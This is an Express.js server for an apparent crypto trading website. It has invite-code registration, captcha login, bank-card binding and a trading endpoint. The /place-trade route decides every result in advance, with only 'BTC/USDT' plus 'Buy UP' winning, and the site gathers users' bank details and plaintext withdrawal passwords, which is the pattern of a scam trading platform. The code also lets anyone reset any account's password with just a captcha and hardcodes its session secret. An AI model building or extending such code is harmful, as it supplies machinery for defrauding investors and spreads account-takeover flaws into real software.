const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const svgCaptcha = require('svg-captcha');
const bcrypt = require('bcryptjs');
const low = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');
const path = require('path');

const app = express();
const port = 3000;

// Database setup
const adapter = new FileSync('db.json');
const db = low(adapter);
db.defaults({ users: [], trades: [] }).write();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));
app.use(session({ secret: 'auth-secret', resave: false, saveUninitialized: true }));

// Homepage
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public/index.html'));
});

// Captcha generation
app.get('/captcha', (req, res) => {
  const captcha = svgCaptcha.create({
    noise: 2,
    color: true,
    background: '#ffffff',
    width: 150,
    height: 50,
    fontSize: 45,
    charPreset: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
  });

  let svg = captcha.data;
  svg = svg.replace(/(<text[^>]*?)fill="[^"]*"/g, '$1fill="black"');
  svg = svg.replace(/(<text[^>]*?)style="[^"]*fill:[^;"]*;?[^"]*"/g, '$1style="fill:black"');
  svg = svg.replace(/(<text[^>]*?)y="\d+"/g, '$1y="40"');

  req.session.captcha = captcha.text;
  res.type('svg').send(svg);
});

// Register
app.post('/register', (req, res) => {
  const { email, password, confirmPassword } = req.body;
  const inviteCode = 'nikki23';

  if (password !== confirmPassword) {
    return res.json({ success: false, message: 'Passwords do not match.' });
  }

  const existing = db.get('users').find({ email }).value();
  if (existing) {
    return res.json({ success: false, message: 'User already exists.' });
  }

  const hashed = bcrypt.hashSync(password, 10);
  db.get('users').push({
    email,
    password: hashed,
    inviteCode,
    balance: 2000,
    trades: []
  }).write();

  return res.json({ success: true });
});

// Login
app.post('/login', (req, res) => {
  const { email, password, captcha } = req.body;

  if (captcha !== req.session.captcha) {
    return res.json({ success: false, message: 'Invalid captcha.' });
  }

  const user = db.get('users').find({ email }).value();
  if (!user || !bcrypt.compareSync(password, user.password)) {
    return res.json({ success: false, message: 'Invalid email or password.' });
  }

  req.session.user = {
    email,
    inviteCode: user.inviteCode || 'nikki23'
  };

  return res.json({ success: true });
});

// Profile data
app.get('/profile-data', (req, res) => {
  if (!req.session.user) return res.status(401).json({ error: 'Not logged in' });

  const user = db.get('users').find({ email: req.session.user.email }).value();
  if (!user) return res.status(404).json({ error: 'User not found' });

  const { email, inviteCode, bank, balance } = user;
  res.json({ email, inviteCode, bank, balance });
});

// Reset password
app.post('/reset-password', (req, res) => {
  const { email, captcha, newPassword } = req.body;

  if (captcha !== req.session.captcha) {
    return res.json({ success: false, message: 'Invalid captcha.' });
  }

  const user = db.get('users').find({ email }).value();
  if (!user) return res.json({ success: false, message: 'Email not found.' });

  const hashed = bcrypt.hashSync(newPassword, 10);
  db.get('users').find({ email }).assign({ password: hashed }).write();

  return res.json({ success: true });
});

// Withdraw password
app.post('/update-withdraw-password', (req, res) => {
  const { withdrawPassword } = req.body;

  if (!req.session.user) return res.status(401).json({ error: "Unauthorized" });
  if (!withdrawPassword || withdrawPassword.length < 4)
    return res.status(400).json({ error: "Invalid password" });

  db.get('users')
    .find({ email: req.session.user.email })
    .assign({ withdrawPassword })
    .write();

  res.json({ success: true });
});

// Bind bank card
app.post('/bind-bank-card', (req, res) => {
  const { bankName, accountNumber, accountHolderName } = req.body;
  if (!req.session.user) return res.status(401).json({ message: 'Not logged in' });

  if (!bankName || !accountNumber || !accountHolderName) {
    return res.status(400).json({ message: 'Missing bank card information' });
  }

  db.get('users')
    .find({ email: req.session.user.email })
    .assign({
      bank: {
        bankName,
        accountNumber,
        accountHolderName
      }
    })
    .write();

  return res.json({ success: true });
});

// Updated trade route with full validation and logic
app.post('/place-trade', (req, res) => {
  if (!req.session.user) return res.status(401).json({ success: false, message: 'Not logged in' });

  const { pair, direction, amount, profitPercent, timeframe } = req.body;

  if (
    !pair || !direction || !amount || profitPercent === undefined || !timeframe
  ) {
    return res.json({ success: false, message: 'Missing trade parameters' });
  }

  const user = db.get('users').find({ email: req.session.user.email }).value();
  if (!user) return res.status(404).json({ success: false, message: 'User not found' });

  const tradeAmount = parseFloat(amount);
  const profitPct = parseFloat(profitPercent);
  const tradeTimeframe = parseInt(timeframe, 10);

  if (
    isNaN(tradeAmount) || tradeAmount <= 0 ||
    tradeAmount > user.balance
  ) {
    return res.json({ success: false, message: 'Invalid trade amount or insufficient balance' });
  }

  if (isNaN(profitPct) || profitPct < 0) {
    return res.json({ success: false, message: 'Invalid profit percent' });
  }

  if (isNaN(tradeTimeframe) || tradeTimeframe <= 0) {
    return res.json({ success: false, message: 'Invalid timeframe' });
  }

  // Only BTC/USDT paired with Buy UP yields a win, else loss
  let isWin = false;
  if (pair === 'BTC/USDT' && direction === 'Buy UP') {
    isWin = true;
  }

  // Calculate profit or loss
  const profitAmount = isWin ? tradeAmount * (profitPct / 100) : -tradeAmount;

  // Update balance after trade result
  const newBalance = user.balance + profitAmount;

  // Create trade object
  const trade = {
    id: Date.now(),
    pair,
    direction,
    amount: tradeAmount,
    profit: profitAmount.toFixed(2),
    result: isWin ? 'WIN' : 'LOSS',
    profitPercent: profitPct,
    timeframe: tradeTimeframe,
    timestamp: new Date().toISOString()
  };

  // Update user balance and add trade
  db.get('users')
    .find({ email: req.session.user.email })
    .assign({ balance: newBalance })
    .get('trades')
    .push(trade)
    .write();

  return res.json({
    success: true,
    trade,
    balance: newBalance.toFixed(2),
  });
});

// Trade history
app.get('/trade-history', (req, res) => {
  if (!req.session.user) return res.status(401).json({ error: 'Not logged in' });

  const user = db.get('users').find({ email: req.session.user.email }).value();
  if (!user) return res.status(404).json({ error: 'User not found' });

  const trades = user.trades || [];
  res.json({ trades });
});

// Change password
app.post('/change-password', (req, res) => {
  const { oldPassword, newPassword, confirmPassword } = req.body;

  if (!req.session.user) return res.status(401).json({ success: false, message: 'Not logged in' });

  const user = db.get('users').find({ email: req.session.user.email }).value();
  if (!user) return res.status(404).json({ success: false, message: 'User not found' });

  if (!bcrypt.compareSync(oldPassword, user.password)) {
    return res.json({ success: false, message: 'Old password is incorrect' });
  }

  if (newPassword !== confirmPassword) {
    return res.json({ success: false, message: 'New passwords do not match' });
  }

  const hashed = bcrypt.hashSync(newPassword, 10);
  db.get('users').find({ email: user.email }).assign({ password: hashed }).write();

  return res.json({ success: true });
});

// Logout
app.post('/logout', (req, res) => {
  req.session.destroy(() => {
    res.json({ success: true });
  });
});

// Protect bankcard.html route from unauthorized access
app.get('/bankcard.html', (req, res, next) => {
  if (!req.session.user) return res.redirect('/login.html');
  next();
});

// Start server
app.listen(port, () => {
  console.log(`✅ Server running at http://localhost:${port}`);
});
